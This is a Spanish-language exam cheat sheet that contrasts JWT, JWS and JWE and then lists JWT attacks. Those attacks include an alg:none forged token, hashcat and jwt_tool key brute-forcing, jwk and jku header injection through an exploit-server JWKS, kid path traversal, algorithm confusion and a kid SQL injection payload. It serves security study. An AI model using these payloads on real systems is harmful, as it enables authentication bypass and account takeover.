Tipos: JWT vs JWS vs JWE

| Tipo             | Qué es                                                                    | Estructura                                               | Confidencialidad                                        |
| ---------------- | ------------------------------------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------- |
| **JWT**          | El estándar general (JSON Web Token). Es el "concepto padre".             | Puede implementarse como JWS o JWE                       | Depende                                                 |
| **JWS**          | JSON Web **Signature**. El 99% de los JWT que verás en el examen son JWS. | `header.payload.signature` (3 partes, separadas por `.`) | ❌ Payload va en Base64URL, **NO cifrado**, solo firmado |
| **JWE**          | JSON Web **Encryption**. Menos común, pero puede aparecer.                | 5 partes: `header.encryptedKey.iv.ciphertext.tag`        | ✅ Payload cifrado                                       |
|                  | JWS                                                                       | JWE                                                      |                                                         |
| Nombre completo  | JSON Web **Signature**                                                    | JSON Web **Encryption**                                  |                                                         |
| Qué protege      | Integridad (que nadie lo modificó)                                        | Confidencialidad (que nadie lo lea)                      |                                                         |
| El payload es... | Visible (Base64URL, no cifrado)                                           | Cifrado                                                  |                                                         |
| Segmentos        | 3 (`header.payload.signature`)                                            | 5 (`header.encryptedKey.iv.ciphertext.tag`)              |                                                         |
| Uso típico       | Tokens de sesión, autenticación                                           | Datos sensibles que ni el cliente debe poder leer        |                                                         |

**Cómo reconocerlos a simple vista:**

- 3 segmentos separados por `.` → JWS (lo normal)
- 5 segmentos separados por `.` → JWE (raro, pero si lo ves, piensa en cifrado, no en firma)

## Ataques principales (con Burp + JWT Editor)

**1. Unverified signature** Edita payload, reenvía sin re-firmar. `{"sub":"administrator"}`

**2. alg:none**

```
alg → none / None / NONE / nOnE
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

(firma vacía, token termina en `.`)

**3. Weak signing key (HS256 bruteforce)**

bash

```bash
hashcat -a 0 -m 16500 token.txt rockyou.txt
python3 jwt_tool.py <token> -C -d rockyou.txt
```

**4. jwk header injection** JWT Editor → New RSA Key → Attack → Embedded JWK

**5. jku header injection**

```
1. New RSA Key
2. Host JWK Set en Exploit Server (/jwks.json)
3. "jku":"https://exploit-server.net/jwks.json"
4. Firmar con privada propia
```

**6. kid path traversal**

```
"kid": "../../../../dev/null"
→ secreto = "" → guardar Symmetric Key vacía → firmar HS256
```

**7. alg confusion RS256→HS256 (clave expuesta)**

```
1. Sacar pública: /jwks.json, cert TLS, endpoint
2. Guardar como Symmetric Key en JWT Editor
3. alg → HS256, firmar
```

**8. alg confusion (sin clave expuesta)**

```
Buscar pública: /.well-known/jwks.json, /certs, repo, TLS
→ igual que #7
```

---

Extra: `kid` SQLi: `"1' UNION SELECT 'secreto'-- -"`
